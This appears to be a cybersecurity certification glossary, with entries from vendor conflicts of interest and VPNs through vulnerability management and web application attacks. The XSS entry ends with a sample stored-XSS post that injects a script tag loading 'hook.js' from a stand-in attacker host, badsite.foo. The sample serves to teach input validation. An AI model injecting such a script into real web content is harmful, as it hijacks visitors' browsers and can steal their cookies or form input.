A conflict of interest arises when an individual or organization has competing interests or obligations that could compromise their ability to act objectively, impartially, or in the best interest of another party. When performing vendor assessments, it is vital to determine whether a vendor's interests, relationships, or affiliations may influence their ability to provide unbiased recommendations, fair pricing, or deliver services without bias. Organizations must diligently identify and address potential conflicts of interest, including scrutinizing the vendor's affiliations, relationships with competitors or stakeholders, financial interests, and any potential bias that could compromise their integrity. Some examples of conflict of interest include the following items:

1. Financial Interests - A vendor may have a financial interest in recommending specific products or services due to partnerships, commissions, or financial incentives that bias their recommendations and lead to selecting options that may not fit the organization's needs.

2. Personal Relationships - If a vendor has personal relationships or close ties with decision-makers within the organization, it can influence decision-making and compromise the objective evaluation of other vendors.

3. Competitive Relationships - A vendor may have a business relationship or competitive interest with another vendor under consideration, which can lead a vendor to prioritize their own interests or partnerships over the organization's best interests.

4. Insider Information - In cases where a vendor has access to confidential or proprietary information about other vendors or the organization's strategic plans, the vendor may use this information to gain an unfair advantage or manipulate the selection process.
Version Control - The practice of ensuring that the assets that make up a project are closely managed when it comes time to make changes.

Version control refers to tracking and controlling changes to documents, code, or other important data. Organizations can use version control to maintain a historical record of changes, ensure only approved changes are implemented, and quickly revert changes to a previous version as warranted. Version control is also important when diagrams, policies, and procedures require updates. In this way, version control prevents confusion associated with using outdated or inconsistent documents.
Video Surveillance - Physical security control that uses cameras and recording devices to visually monitor the activity in a certain area.

Video surveillance is a cheaper means of providing surveillance than maintaining separate guards at each gateway or zone, though it is still not cheap to set up if the infrastructure is not already in place on the premises. It is also quite an effective deterrent. The other big advantage is that movement and access can be recorded. The main drawback compared to the presence of security guards is that response times are longer, and security may be compromised if not enough staff are in place to monitor the camera feeds.

The cameras in a CCTV network are typically connected to a multiplexer using coaxial cabling. The multiplexer can then display images from the cameras on one or more screens, allow the operator to control camera functions and record the images to tape or hard drive. Newer camera systems may be linked in an IP network using regular data cabling.
Virtual Network Computing (VNC) - Remote access tool and protocol. VNC is the basis of macOS screen sharing.
Virtual Private Cloud (VPC) - A private network segment made available to a single cloud consumer on a public cloud.
Virtual Private Network (VPN) - A secure tunnel created between two endpoints connected via an unsecure transport network (typically the Internet).

With a remote access VPN, clients connect to a VPN gateway on the edge of the private network. This client-to-site VPN topology is the "telecommuter" model, allowing homeworkers and employees working in the field to connect to the corporate network. The VPN protocol establishes a secure tunnel (the practice of encapsulating data from one protocol for safe transfer over another network such as the Internet) to keep the contents private, even when the packets pass over ISPs' routers.

A VPN can also be deployed in a site-to-site model to connect two or more private networks. Whereas remote access VPN connections are typically initiated by the client, a site-to-site VPN is configured to operate automatically. The gateways exchange security information using whichever protocol the VPN is based on. This establishes a trust relationship between the gateways and sets up a secure connection through which to tunnel data. Hosts at each site do not need to be configured with any information about the VPN. The routing infrastructure at each site determines whether to deliver traffic locally or send it over the VPN tunnel.

A third topology is a host-to-host tunnel. This is a means of securing traffic between two computers where the private network is not trusted.

Several VPN protocols have been used over the years. Legacy protocols such as the Point-to-Point Tunneling Protocol (PPTP) have been deprecated because they do not offer adequate security. Transport Layer Security (TLS) and Internet Protocol Security (IPsec) are now the preferred options for configuring VPN access.
Virtualization - A computing environment where multiple independent operating systems can be installed to a single hardware platform and run simultaneously.
Virtualization Vulnerabilities - While offering numerous benefits such as cost savings, scalability, and efficiency, virtualization also introduces unique vulnerabilities. A significant one is the concept of VM escape. This happens when an attacker with access to a virtual machine breaks out of this isolated environment and gains access to the host system or other VMs running on the same host. Such a vulnerability could allow an attacker to gain control of all virtual machines running on a single physical server, leading to a potentially devastating security breach.

A famous example is the "Cloudburst" vulnerability in VMware's virtual machine display function. The Cloudburst vulnerability, officially designated as CVE-2009-1244, was a critical security flaw discovered in 2009 in VMware's ESX Server, a popular enterprise-level virtualization platform. A vulnerability in the virtual machine display function allowed a guest operating system to execute code on the host operating system.

Another significant vulnerability associated with virtualization involves resource reuse. Virtual machines are frequently created, used, and then deleted in a virtualized environment. If the resources, such as disk space or memory, are not properly sanitized between each use, sensitive data could be leaked between virtual machines. For instance, a new virtual machine may be allocated disk space that was previously used by another VM, and if this disk space is not properly wiped, the new VM could recover sensitive data from the previous VM.

Thorough data sanitization practices, ensuring data encryption throughout the lifecycle, and implementing robust encryption key management practices mitigate the risk of resource reuse in cloud infrastructure. Training on cloud provider security features and best practices and segregating resources based on security levels also mitigates risks.

Virtualization platforms depend upon specialized hypervisors that contain security vulnerabilities and weaknesses. Attackers exploit hypervisors to gain unauthorized access and compromise the virtual machines (VMs) running on them. Hypervisors typically provide specialized management interfaces so administrators can control and monitor their virtualized environments. These interfaces can become potential attack vectors if insecure. For example, weak authentication, lack of encryption, or vulnerabilities in communication protocols can lead to unauthorized access to the virtualized environment. Like any software, hypervisors have vulnerabilities that must be regularly patched.
Virus - A computer virus is a type of malware designed to replicate and spread from computer to computer, usually by "infecting" executable applications or program code. There are several different types of viruses, and they are generally classified by the different types of file or media that they infect:

1. Non-resident/file infector - The virus is contained within a host executable file and runs with the host process. The virus will try to infect other process images on persistent storage and perform other payload actions. It then passes control back to the host program.

2. Memory resident - When the host file is executed, the virus creates a new process for itself in memory. The malicious process remains in memory, even if the host process is terminated.

3. Boot - The virus code is written to the disk boot sector or the partition table of a fixed disk or USB media and executes as a memory-resident process when the OS starts or the media is attached to the computer.

4. Script and Macro Viruses - The malware uses the programming features available in local scripting engines for the OS and/or browser, such as PowerShell, Windows Management Instrumentation (WMI), JavaScript, Microsoft Office documents with Visual Basic for Applications (VBA) code enabled, or PDF documents with JavaScript enabled.

In addition, the term "multipartite" is used for viruses that use multiple vectors and the term "polymorphic" is used for viruses that can dynamically change or obfuscate their code to evade detection.

What these types of viruses have in common is that they must infect a host file or media. An infected file can be distributed through any normal means—on a disk, on a network, as an attachment to an email or social media post, or as a download from a website.
Vishing - A human-based attack where the attacker extracts information while speaking over the phone or leveraging IP-based voice messaging services (VoIP). a phishing attack conducted through a voice channel (telephone or VoIP, for instance). For example, targets could be called by someone purporting to represent their bank asking them to verify a recent credit card transaction and requesting their security details. It can be much more difficult for someone to refuse a request made in a phone call compared to one made in an email. Rapid improvements in deep fake technology are likely to make phishing attempts via voice and even video messaging more prevalent in the future.
Vulnerability - A weakness that could be triggered accidentally or exploited intentionally to cause a security breach. Vulnerability is a weakness that could be triggered accidentally or exploited intentionally to cause a security breach. Examples of vulnerabilities include improperly configured or installed hardware or software, delays in applying and testing software and firmware patches, poorly designed network architecture, inadequate physical security, insecure password usage, and design flaws in software or operating systems. Factors such as the value of the vulnerable asset and the ease of exploiting the fault determine the severity of vulnerabilities.
Vulnerability Analysis - Vulnerability analysis is critical in supporting several key aspects of an organization's cybersecurity strategy, including prioritization, vulnerability classification, considerations of exposure, organizational impact, and risk tolerance contexts.

Prioritization
Vulnerability analysis helps prioritize remediation efforts by identifying the most critical vulnerabilities that pose the most significant risk to an organization. Prioritization is typically based on factors such as the vulnerability severity, the ease of exploitation, and the potential impact of an attack. Prioritizing vulnerabilities helps an organization focus limited resources on addressing the most significant threats first.

Classification
Vulnerability analysis aids in vulnerability classification, categorizing vulnerabilities based on their characteristics, such as the type of system or application affected, the nature of the vulnerability, or the potential impact. Classification can help clarify the scope and nature of an organization's threats.

Exposure Factor
Vulnerability analysis must also consider exposure factors like the accessibility of a vulnerable system or data and environmental factors like the current threat landscape or the specifics of the organization's IT infrastructure. These factors can significantly influence the likelihood of a vulnerability being exploited and directly impact its overall risk level.

Exposure factor (EF - In risk calculation, the percentage of an asset's value that would be lost during a security incident or disaster scenario) represents the extent to which an asset is susceptible to being compromised or impacted by a specific vulnerability, and it helps assess the potential impact or loss that could occur if the vulnerability is exploited. Factors might include weak authentication mechanisms, inadequate network segmentation, or insufficient access control methods.

Impacts
Vulnerability analysis assesses the potential organizational impact of vulnerabilities. This could include financial loss, reputational damage, operational disruption, or regulatory penalties. Understanding this impact is crucial for making informed decisions about risk mitigation.

Environmental Variables
Several environmental variables (In vulnerability assessment, factors or metrics due to local network or host configuration that increase or decrease the base likelihood and impact risk level) play a significant role in influencing vulnerability analysis. One of the primary environmental factors is the organization's IT infrastructure which includes the hardware, software, networks, and systems in use. These components' diversity, complexity, and age can affect the number and types of vulnerabilities present. For instance, legacy systems may have known unpatched vulnerabilities, while new emerging technologies might introduce unknown vulnerabilities.

The external threat landscape is another crucial environmental factor. The prevalence of certain types of attacks or the activities of specific threat actors can affect the likelihood of exploitation of particular vulnerabilities. For example, if ransomware attacks are rising within the medical industry, that sector can prioritize those vulnerabilities.

The regulatory and compliance environment is another significant factor. Organizations in heavily regulated industries, like healthcare or finance, may need to prioritize vulnerabilities that could lead to sensitive data breaches and result in regulatory penalties. The operational environment, including the organization's workflows, business processes, and usage patterns, can also influence vulnerability analysis. Certain operational practices increase exposure to specific vulnerabilities or affect the potential impact of a successful exploit. Examples include poor patch management practices, lack of rigorous access controls, lack of awareness training, poor configuration management practices, and insufficient application development policies.

Risk Tolerance
Vulnerability analysis must align with an organization's risk tolerance. Risk tolerance (A strategic assessment of what level of residual risk is tolerable for an organization) refers to the level of risk an organization is willing to accept. This can vary greatly depending on the organization's size, industry, regulatory environment, and strategic objectives. By aligning vulnerability analysis with risk tolerance, an organization can ensure its vulnerability management efforts align with its overall risk management strategy.
Vulnerability Assessment Methods - Penetration Testing
Penetration testing (A test that uses active tools and security utilities to evaluate security by simulating an attack on a system. A pen test will verify that a threat exists, then will actively test and bypass security controls, and will finally exploit vulnerabilities on the system), or pen testing, is a more aggressive approach to vulnerability management. Ethical hackers attempt to breach an organization's security in this practice, exploiting vulnerabilities to demonstrate their potential impact. While automated vulnerability scans and threat feeds are essential components of a robust security program, they may sometimes fail to identify specific vulnerabilities that a penetration test can uncover.

Penetration testing involves human ingenuity and creativity, which allows for discovering complex vulnerabilities that automated tools often miss. For example, vulnerabilities introduced by the application's design and implementation and not coding errors can often go unnoticed by automated scanners. Penetration testers can manipulate an application's functionality to perform actions in ways not intended by its developers, leading to exploitation. Certain types of authentication bypass vulnerabilities or chained vulnerabilities (where multiple minor issues can be combined to create a significant security flaw) are often beyond the detection capabilities of automated scanning tools.

Penetration tests also excel at identifying vulnerabilities associated with improper configurations or weak security policies. While automated scanning methods provide critical vulnerability data, penetration testing provides a deeper and more comprehensive analysis of an organization's security posture.

1. Unknown environment (previously known as black box) testing - Is when the consultant/attacker has no privileged information about the network and its security systems. This type of test requires the consultant/attacker to perform an extensive reconnaissance phase. These tests are useful for simulating the behavior of an external threat.

2. Known environment (previously known as white box) testing - Is when the consultant/attacker has complete access to information about the network. These tests are useful for simulating the behavior of a privileged insider threat.

3. Partially known environment (previously known as gray box) testing - Is when the consultant/attacker has some information. This type of test requires partial reconnaissance on the part of the consultant/attacker.

Bug Bounties
Bug bounty (Reward scheme operated by software and web services vendors for reporting vulnerabilities) programs are another proactive strategy and describe when organizations incentivize discovering and reporting vulnerabilities by offering rewards to external security researchers or "white hat" hackers. Both penetration testing and bug bounty programs are proactive cybersecurity practices to identify and mitigate vulnerabilities in a system or application. They both involve exploiting vulnerabilities to understand their potential impact, with the difference lying primarily in who conducts the testing and how it's structured. Penetration testing is typically performed by a hired team of professional ethical hackers within a confined time frame, using a structured approach based on the organization's requirements. This approach allows for a focused, in-depth examination of specific systems or applications and provides a predictable cost and timeline.

In contrast, bug bounty programs open the testing process to a global community of independent security researchers. Rewards for finding and reporting vulnerabilities incentivize these researchers. This approach can bring diverse skills and perspectives to the testing process, potentially uncovering more complex or obscure vulnerabilities.

An organization may choose penetration testing for a more controlled, targeted assessment, especially when testing specific components or meeting certain compliance requirements. A bug bounty program might be preferred when seeking a more extensive range of testing, leveraging the collective skills of a global community. However, many organizations see the value in both and use a combination of pen testing and bug bounty programs to ensure comprehensive vulnerability management.

Responsible disclosure programs are established by organizations to encourage individuals to report security vulnerabilities in software or systems, allowing the organization to address and fix these vulnerabilities before they can be exploited maliciously. Responsible disclosure programs provide guidelines and procedures for reporting vulnerabilities and often offer rewards or recognition to individuals who responsibly disclose verified security issues.

Auditing
Auditing is an essential part of vulnerability management. Where product audits focus on specific features, such as application code, system/process (An audit process with a wide scope, including assessment of supply chain, configuration, support, monitoring, and cybersecurity factors) audits interrogate the wider use and deployment of products, including supply chain, configuration, support, monitoring, and cybersecurity. Security audits assess an organization's security controls, policies, and procedures, often using standards like ISO 27001 or the NIST Cybersecurity Framework as benchmarks. These audits can identify technical vulnerabilities and operational weaknesses impacting an organization's security posture.

Cybersecurity audits are comprehensive reviews designed to ensure an organization's security posture aligns with established standards and best practices. There are various types of cybersecurity audits, including compliance audits, which assess adherence to regulations like GDPR or HIPAA; risk-based audits, which identify potential threats and vulnerabilities in an organization's systems and processes; and technical audits, which delve into the specifics of the organization's IT infrastructure, examining areas like network security, access controls, and data protection measures.

Penetration testing fits into cybersecurity audit practices as a critical component of a technical audit as it provides a practical assessment of the organization's defenses by simulating real-world attack scenarios. Rather than simply evaluating policies or configurations, penetration tests actively seek exploitable vulnerabilities, providing a clear picture of what an attacker might achieve. The findings from these tests are then used to improve the organization's security controls and mitigate identified risks.

Penetration tests also play an important role in compliance audits, as many regulations require organizations to conduct regular penetration testing as part of their cybersecurity program. For instance, the Payment Card Industry Data Security Standard (PCI DSS - The information security standard for organizations that process credit or bank card payments) mandates annual and proactive penetration tests for organizations handling cardholder data.
Vulnerability Feed - A synchronizable list of data and scripts used to check for vulnerabilities. Also referred to as plug-ins or network vulnerability tests (NVTs).
Vulnerability Response and Remediation - Vulnerability response and remediation practices encompass various strategies and tactics, including patching, insurance, segmentation, compensating controls, exceptions, and exemptions, each playing a distinct role in managing and mitigating cybersecurity risks.

Remediation Practices

1. Patching - Is one of the most straightforward and effective remediation practices. It involves applying updates and patches to software or systems to fix known vulnerabilities. Patching helps prevent attackers from exploiting known vulnerabilities, improving an organization's security posture. Robust, centralized patch management processes are essential to ensure patches are applied promptly and consistently. A patch management program focuses on regularly installing software patches to address vulnerabilities and improve security in various types of systems, including operating systems, network devices (routers, switches, and firewalls), databases, web applications, desktop applications (email clients, web browsers, and office productivity applications), and other software applications deployed within an organization's IT environment.

2. Cybersecurity Insurance - Can provide financial protection in case of a security breach resulting from a vulnerability. It is another factor in vulnerability response. While insurance doesn't mitigate vulnerabilities directly, it is important in a comprehensive risk management strategy, complementing technical controls with financial risk transfer. Examples include coverage for data breach response costs, business interruption, ransomware attacks, third-party liability, cyber extortion, and many others.

3. Segmentation - Involves dividing a network into separate segments to contain potential security breaches. If an attacker exploits a vulnerability and gains access to one segment they are confined to that segment. This prevents them from moving laterally across the entire network, limiting the impact of a successful attack and supporting incident response teams.

4. Compensating Controls - Refer to measures put in place to mitigate the risk of a vulnerability when security teams cannot directly eliminate it or when direct remediation is not immediately possible. Examples include additional monitoring, secondary authentication mechanisms, or enhanced encryption.

5. Exceptions and Exemptions -  describe scenarios where specific vulnerabilities cannot be remediated due to business criticality, technical constraints, or cost constraints. In these cases, the senior leadership teams accept the risk and document the rationale for the decision along with an established timeline for reassessment.

Validation
Validating vulnerability remediation is critically important for several key reasons. Validation ensures that the remediation actions have been implemented correctly and function as intended. Despite best intentions, human error or technical problems can frequently lead to incomplete or incorrect implementation of fixes. These issues go unnoticed without validation, exposing the organization to the same vulnerability it originally sought to address.

Validation helps confirm that the remediation has not inadvertently introduced new issues or vulnerabilities. For example, a patch may interfere with other software or systems, or a configuration change could expose new security gaps.

Also, validation provides a measure of accountability, ensuring that responsible parties adequately addressed identified vulnerabilities. This is especially important in larger organizations where multiple teams or individuals may be involved in the remediation process.

1. Re-scanning  - Involves performing additional vulnerability scans after remediation actions have been implemented. The re-scan aims to determine if the vulnerabilities identified in the initial scan have been resolved. If the same vulnerabilities are not identified in the re- scan, it strongly indicates that the remediation efforts were successful.

2. Auditing - Involves an in-depth examination of the remediation process by reviewing the steps taken to address the vulnerability and ensuring they align with the organization's policies and best practices. Audits also verify that necessary documentation has been updated, such as records of identified vulnerabilities, remediation actions taken, and any exceptions or exemptions granted.

3. Verification - Is the process of confirming the results of the remediation actions and involves various methods, including manual checks, automated testing, or reviews of system logs or other records. Verification ensures that remediation steps have been implemented correctly, function as intended, and do not introduce new issues or vulnerabilities.

Reporting
Vulnerability reporting is a crucial aspect of vulnerability management and is critical in maintaining an organization's cybersecurity posture. A comprehensive vulnerability report highlights the existing vulnerabilities and ranks them based on their severity and potential impact on the organization's assets, enabling the management to prioritize remediation efforts effectively.

The Common Vulnerability Scoring System (CVSS) provides a standardized method for rating the severity of vulnerabilities and includes metrics such as exploitability, impact, and remediation level. By using CVSS, organizations can compare and prioritize vulnerabilities consistently.

Another important practice is including information about the potential impact of each vulnerability in the report. This could involve describing the possible outcomes of exploiting of the vulnerability, including data breaches, system outages, or other operational impacts. It is essential to provide recommendations for addressing each vulnerability in the report. Recommendations might suggest specific patches or updates, recommend configuration changes, or identify other mitigation strategies.

Timely reporting is also essential, as delays in reporting can lead to delays in remediation and increase the window of opportunity for attackers. Vulnerability reports must use a clear, concise format that is easy for technical and nontechnical stakeholders to understand to help ensure that the report is understood and that appropriate actions are taken in response.
Vulnerability Scanning - Vulnerability management is a cornerstone of modern cybersecurity practices aimed at identifying, classifying, remediating, and mitigating vulnerabilities within a system or network. One crucial aspect of vulnerability management is vulnerability scanning, a systematic process of probing a system or network using specialized software tools to detect security weaknesses. Vulnerability scans are performed internally and externally to inventory vulnerabilities from different network viewpoints. Vulnerabilities identified during scanning are then classified and prioritized for remediation by security operations teams.

Vulnerability scanning also supports application security, as it helps to locate and identify misconfigurations and missing patches in software. Advanced vulnerability scanning techniques focused on application security include specialized application scanners, pen-testing frameworks, and static and dynamic code testing.

Vulnerability scanning tools like openVAS and Nessus are popular tools offering a broad range of features designed to analyze network equipment, operating systems, databases, patch compliance, configuration, and many other systems. While these tools are very effective, application security analysis warrants much more specialized approaches. Several specialized tools exist to more deeply analyze how applications are designed to operate and can locate vulnerabilities not typically identified using generalized scanning approaches.

Network Vulnerability Scanner
A network vulnerability scanner (Hardware or software configured with a list of known weaknesses and exploits and that can scan for their presence in a host OS or particular application), such as Tenable Nessus or OpenVAS, is designed to test network hosts, including client PCs, mobile devices, servers, routers, and switches. It examines an organization's on-premises systems, applications, and devices and compares the scan results to configuration templates and lists of known vulnerabilities. Typical results from a vulnerability assessment will identify missing patches, deviations from baseline configuration templates, and other related vulnerabilities.

Scanners depend upon a database of known software and configuration vulnerabilities. The tool compiles a report about each vulnerability in its database that was found to be present on each host. Each identified vulnerability is categorized and assigned an impact warning. Most tools also suggest remediation techniques. This information is highly sensitive, so use of these tools and the distribution of the reports produced should be restricted to authorized hosts and user accounts.

Network vulnerability scanners are configured with information about known vulnerabilities and configuration weaknesses for typical network hosts. These scanners will be able to test common operating systems, desktop applications, and some server applications. This is useful for general purpose scanning, but some types of applications might need more rigorous analysis.

Credentialed and Non-Credentialed Scans
A non-credentialed scan (A scan that uses fewer permissions and many times can only find missing patches or updates) is one that proceeds by directing test packets at a host without being logged on to the OS or application. The view is the one the host exposes to an unprivileged user on the network. The test routines may be able to include things such as using default passwords for service accounts and device management interfaces, but they are not given privileged access. While you may discover more weaknesses with a credentialed scan, you will sometimes want to narrow your focus to that of an attacker who doesn't have specific high-level permissions or total administrative access. Non-credentialed scanning is the most appropriate technique for external assessment of the network perimeter or when performing web application scanning.

A credentialed scan (A scan that uses credentials, such as usernames and passwords, to take a deep dive during the vulnerability scan, which will produce more information while auditing the network) is giving a user account with login rights to various hosts, plus whatever other permissions are appropriate for the testing routines. This sort of test allows much more in-depth analysis, especially in detecting when applications or security settings may be misconfigured. It shows what an insider attack, or an attack with a compromised user account, may be able to achieve. A credentialed scan is a more intrusive type of scan than non-credentialed scanning.

Application and Web Application Scanners
Similarly, application vulnerability scanning (A vulnerability testing tool designed to identify issues with application code and platform configuration, including web servers and web applications) describes a specialized vulnerability scanning method for identifying software application weaknesses. This includes static analysis (The process of reviewing uncompiled source code either manually or using automated tools. Reviewing application code without executing it) and dynamic analysis (Software testing that examines code behavior during runtime. It helps identify potential security issues, potential performance issues, and other problems. Testing running applications), which can identify issues like unvalidated inputs, broken access controls, and SQL injection vulnerabilities. Application vulnerability scanning is typically handled separately from general vulnerability scanning due to the unique nature of software applications and the specific types of vulnerabilities they introduce. General vulnerability scanning is designed to detect system-wide or network-wide weaknesses, such as out-of-date software or misconfigured firewalls.

In contrast, application vulnerability scanning evaluates the coding and behavior of individual software applications. It looks for issues like cross-site scripting (XSS), SQL injection, and insecure direct object references unique to software applications. These application-specific vulnerabilities require specialized tools and techniques to identify and mitigate and are generally different from the scanning tools used in general vulnerability scanning. Applications frequently have their own release and update cycles, separate from the rest of the environment, necessitating a more targeted vulnerability management process.

Package Monitoring
Another important capability in application vulnerability assessment practices includes package monitoring (Techniques and tools designed to mitigate risks from application vulnerabilities in third-party code, such as libraries and dependencies). Package monitoring is associated with vulnerability identification because it tracks and assesses the security of third-party software packages, libraries, and dependencies used within an organization to ensure that they are up to date and free from known vulnerabilities that malicious actors could exploit. Package monitoring is associated with the management of software bill of materials (SBOM - A list of detailed information about the software components and dependencies used in an application or system) and software supply chain risk management practices.

In an enterprise setting, package monitoring is typically achieved through automated tools and governance policies. Automated software composition analysis (SCA - Tools designed to assist with identification of third-party and open-source code during software development and deployment) tools track and monitor the software packages, libraries, and dependencies used in an organization's codebase. These tools can automatically identify outdated packages or packages with known vulnerabilities and suggest updates or replacements. They work by continuously comparing the organization's software inventory against various databases of known vulnerabilities, such as the National Vulnerability Database (NVD) or vendor-specific advisories.

In addition to these tools, organizations often implement governance policies around software usage. These policies may require regular audits of software packages, approval processes for adding new packages or libraries, and procedures for updating or patching software when vulnerabilities are identified.
Vulnerability Types - 1. Legacy and End-of-Life (EOL) Systems
Hardware vulnerabilities, particularly those associated with end-of-life and legacy systems, present considerable security challenges for many organizations, as patches or fixes for vulnerabilities are either unavailable or difficult to apply. End-of-life (EOL) and legacy systems share a common characteristic: they are both outdated. EOL systems may be legacy systems, and some legacy systems are also EOL.

The manufacturer or vendor no longer supports EOL systems, so they do not receive updates, including critical security patches. This makes them vulnerable to newly discovered threats. Conversely, while still outdated, the vendor may still fully support legacy systems.

An EOL system is a specific product or version of a product that the manufacturer or vendor has publicly declared as no longer supported. It is also possible for open-source projects to be abandoned by the maintainers. An EOL system can be a hardware device, a software application, or an operating system. Products should be replaced or updated before they reach EOL status to ensure they remain supported by their vendors and receive critical security patches. Notable EOL product examples include the Windows 7 and Server 2008 operating systems, which stopped receiving updates in January 2020. These systems are significantly more vulnerable to attacks due to the absence of security patches for new vulnerabilities. Despite their EOL status, they are still in use in many environments.

Many devices (peripheral devices especially) remain on sale with known severe vulnerabilities in firmware or drivers and no possibility of vendor support to remediate them, especially in secondhand, recertified, or renewed/reconditioned marketplaces. Examples include recertified computer equipment, consumer-grade and recertified networking equipment, and various Internet of Things devices.

Legacy systems typically describe outdated software methods, technology, computer systems, or application programs that continue to be used despite their shortcomings. Legacy systems often remain in use for extended periods because the organization's leadership recognizes that replacing or redesigning them will be expensive or pose significant operational risks stemming from complexity. The term "legacy" does not necessarily mean that the vendor no longer supports the system but rather that it represents hardware and software methods that are no longer popular and often incompatible with newer architectures or methods. Legacy systems often remain in use because they operate with sufficient reliability, have been incorporated into many critical business functions, and are familiar to long-tenured staff.

Assessing the risks associated with using EOL and legacy products, such as lack of updates, lack of support, and compatibility issues with newer systems, is crucial. EOL and legacy product replacements must continue to meet the organization's requirements, maintain compatibility with existing infrastructure, and support reliable data migration. Selection criteria must consider the availability of vendor support, device warranty details, and marketplace performance/reputation. Transitioning costs must be carefully assessed, too, including licensing, hardware upgrades, and professional service implementation fees. The work to transition away from EOL and legacy products must minimize disruptions and ensure long-term sustainability.

2. Firmware Vulnerabilities
Firmware is the foundational software that controls hardware and can contain significant vulnerabilities. For instance, the Meltdown and Spectre vulnerabilities identified in 2018 impacted almost all computers and mobile devices. The vulnerability was associated with the processors used inside the computer and allowed malicious programs to steal data as it was being processed. Another vulnerability, "LoJax," discovered in the Unified Extensible Firmware Interface (UEFI) firmware in 2018, enabled an attacker to persist on a system even after a complete hard drive replacement or OS reinstallation. End-of-life (EOL) hardware vulnerabilities arise when manufacturers cease providing product updates, parts, or patches to the firmware.

3. Virtualization Vulnerabilities
While offering numerous benefits such as cost savings, scalability, and efficiency, virtualization also introduces unique vulnerabilities. A significant one is the concept of VM escape. This happens when an attacker with access to a virtual machine breaks out of this isolated environment and gains access to the host system or other VMs running on the same host. Such a vulnerability could allow an attacker to gain control of all virtual machines running on a single physical server, leading to a potentially devastating security breach.

A famous example is the "Cloudburst" vulnerability in VMware's virtual machine display function. The Cloudburst vulnerability, officially designated as CVE-2009-1244, was a critical security flaw discovered in 2009 in VMware's ESX Server, a popular enterprise-level virtualization platform. A vulnerability in the virtual machine display function allowed a guest operating system to execute code on the host operating system.

Another significant vulnerability associated with virtualization involves resource reuse. Virtual machines are frequently created, used, and then deleted in a virtualized environment. If the resources, such as disk space or memory, are not properly sanitized between each use, sensitive data could be leaked between virtual machines. For instance, a new virtual machine may be allocated disk space that was previously used by another VM, and if this disk space is not properly wiped, the new VM could recover sensitive data from the previous VM.

Thorough data sanitization practices, ensuring data encryption throughout the lifecycle, and implementing robust encryption key management practices mitigate the risk of resource reuse in cloud infrastructure. Training on cloud provider security features and best practices and segregating resources based on security levels also mitigates risks.

Virtualization platforms depend upon specialized hypervisors that contain security vulnerabilities and weaknesses. Attackers exploit hypervisors to gain unauthorized access and compromise the virtual machines (VMs) running on them. Hypervisors typically provide specialized management interfaces so administrators can control and monitor their virtualized environments. These interfaces can become potential attack vectors if insecure. For example, weak authentication, lack of encryption, or vulnerabilities in communication protocols can lead to unauthorized access to the virtualized environment. Like any software, hypervisors have vulnerabilities that must be regularly patched.
Vulnerable Software - Weakness that could be triggered accidentally or exploited intentionally to cause a security breach. Vulnerable software contains a flaw in its code or design that can be exploited to circumvent access control or to crash the process. Typically, vulnerabilities can only be exploited in quite specific circumstances and are often fixed—patched—swiftly by the vendor. However, because of the complexity of modern software and the speed with which new versions must be released to market, almost no software is free from vulnerabilities. Also, an organization might not have an effective patch management system. Consequently, vulnerable software is a commonly exploited threat vector. A large number of operating systems and applications running on a company's appliances, servers, clients, and cloud networks directly increases the potential attack surface. This attack surface can be reduced by consolidating to fewer products and by ensuring the same version of a product is deployed across the organization. The impact and consequences of a software vulnerability are varied. As two contrasting examples, consider vulnerabilities affecting Adobe's PDF document reader versus a vulnerability in the server software underpinning transport security. The former could give a threat actor a foothold on a corporate network via a workstation; the latter could compromise the cryptographic keys used to provide secure web services. Both are potentially high impact for different reasons.
Warm Site - An alternate processing location that is dormant or performs noncritical functions under normal conditions, but which can be rapidly converted to a key operations site if needed. A warm site could be similar, but with the requirement that the latest data set needs to be loaded.
Watering Hole Attack - An attack in which an attacker targets specific groups or organizations, discovers which websites they frequent, and injects malicious code into those sites. A watering hole attack relies on a group of targets that use an unsecure third-party website. For example, staff running an international e-commerce site might use a local pizza delivery firm. A threat actor might discover this fact through social engineering or other reconnaissance of the target. An attacker can compromise the pizza delivery firm's website so that it runs exploit code on visitors. They may be able to infect the computers of the e-commerce company's employees and penetrate the e-commerce company systems.
Web and Social Media (Message-Based Vector) - Malware may be concealed in files attached to posts or presented as downloads. An attacker may compromise a site so that it automatically infects vulnerable browser software (a drive-by download). Social media may also be used more subtly, such as a disinformation campaign that persuades users to install a "must-have" app that is actually a Trojan.
Web Application Attacks - Web application attacks specifically target applications accessible over the Internet, exploiting vulnerabilities in these applications to gain unauthorized access, steal sensitive data, disrupt services, or perform other malicious activities. The defining characteristics of web application attacks often involve the exploitation of poor input validation (leading to attacks like SQL injection or cross-site scripting), misconfigured security settings, and outdated software with known vulnerabilities.

Web application attacks are similar to other types of application attacks in that they involve exploiting vulnerabilities in software to achieve malicious ends. However, they also have distinct differences. Unlike attacks on desktop applications or embedded systems, web application attacks must navigate the client-server model, often requiring the attacker to bypass network and application-level security controls. Also, web application vulnerabilities can often be exploited remotely by any attacker on the Internet, making them a popular target for cybercriminals.

HTTP is stateless, meaning each request is independent, and the server does not retain information about the client's state. Web applications must manage sessions and maintain state using mechanisms such as cookies or session IDs. Improper session management, such as predictable session IDs, session fixation, or session hijacking, are associated with many types of web application attacks, such as cross-site request forgery (CSRF) and cross-site scripting (XSS). These attacks exploit the web's inherent trust in requests or scripts that appear to come from valid users or trusted sites.

1. Cross-Site Scripting (XSS)
Web applications depend on scripting, and most websites these days are web applications rather than static webpages. If the user attempts to disable scripting, very few sites will be left available. A cross-site scripting (XSS - A malicious script hosted on the attacker's site or coded in a link injected onto a trusted site designed to compromise clients browsing the trusted site, circumventing the browser's security model of trusted zones) attack exploits the fact that the browser is likely to trust scripts that appear to come from a site the user has chosen to visit. XSS inserts a malicious script that appears to be part of the trusted site. A nonpersistent type of XSS attack would proceed as follows:

1. The attacker identifies an input validation vulnerability in the trusted site.

2. The attacker crafts a URL to perform a code injection against the trusted site. This could be coded in a link from the attacker's site to the trusted site or a link in an email message.

3. When the user clicks the link, the trusted site returns a page containing the malicious code injected by the attacker. As the browser is likely to be configured to allow the site to run scripts, the malicious code will execute.

The malicious code could be used to deface the trusted site (by adding any sort of arbitrary HTML code), steal data from the user's cookies, try to intercept information entered into a form, perform a request forgery attack, or try to install malware. The crucial point is that the malicious code runs in the client's browser with the same permission level as the trusted site.

An attack where the malicious input comes from a crafted link is a reflected or nonpersistent XSS attack. A stored/persistent XSS attack aims to insert code into a back-end database or content management system used by the trusted site. For example, the attacker may submit a post to a bulletin board with a malicious script embedded in the message. When other users view the message, the malicious script is executed. For example, with no input sanitization, a threat actor could type the following into a new post text field:

Check out this amazing <a href="https://trusted.foo">website</a><script src="https://badsite.foo/hook.js"></script>.

Users viewing the post will have the malicious script hook.js execute in their browser.

